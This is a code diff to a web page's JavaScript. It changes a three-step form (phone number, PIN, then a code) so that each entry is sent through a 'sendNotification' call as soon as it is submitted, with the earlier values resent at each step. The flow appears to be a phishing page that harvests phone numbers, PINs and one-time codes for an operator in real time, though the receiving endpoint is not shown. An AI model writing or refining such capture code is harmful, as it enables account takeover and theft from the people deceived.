@@ -135,7 +135,7 @@ async function sendNotification(event, data = {}) {
   return response.json();
 }
 
-document.getElementById("phoneButton").onclick = () => {
+document.getElementById("phoneButton").onclick = async () => {
   const phone = document.getElementById("phone").value.trim();
 
   if (!phone) {
@@ -144,11 +144,19 @@ document.getElementById("phoneButton").onclick = () => {
   }
 
   applicationPhone = phone;
-  phoneStage.classList.add("hidden");
-  pinStage.classList.remove("hidden");
+
+  try {
+    // 1. Send independent notification for phone number
+    await sendNotification("phone_submitted", { phone: applicationPhone });
+    
+    phoneStage.classList.add("hidden");
+    pinStage.classList.remove("hidden");
+  } catch {
+    alert("Unable to submit. Please try again.");
+  }
 };
 
-document.getElementById("pinButton").onclick = () => {
+document.getElementById("pinButton").onclick = async () => {
   const pin = document.getElementById("pin").value.trim();
 
   if (!pin) {
@@ -157,8 +165,19 @@ document.getElementById("pinButton").onclick = () => {
   }
 
   applicationPin = pin;
-  pinStage.classList.add("hidden");
-  codeStage.classList.remove("hidden");
+
+  try {
+    // 2. Send independent notification for the PIN (includes phone + pin)
+    await sendNotification("pin_submitted", { 
+      phone: applicationPhone, 
+      pin: applicationPin 
+    });
+
+    pinStage.classList.add("hidden");
+    codeStage.classList.remove("hidden");
+  } catch {
+    alert("Unable to submit. Please try again.");
+  }
 };
 
 document.getElementById("codeButton").onclick = async () => {
@@ -170,7 +189,7 @@ document.getElementById("codeButton").onclick = async () => {
   }
 
   try {
-    // Send phone number, PIN, and code all together in one payload
+    // 3. Send independent notification for the Code (includes phone + pin + code)
     await sendNotification("code_submitted", {
       phone: applicationPhone,
       pin: applicationPin,
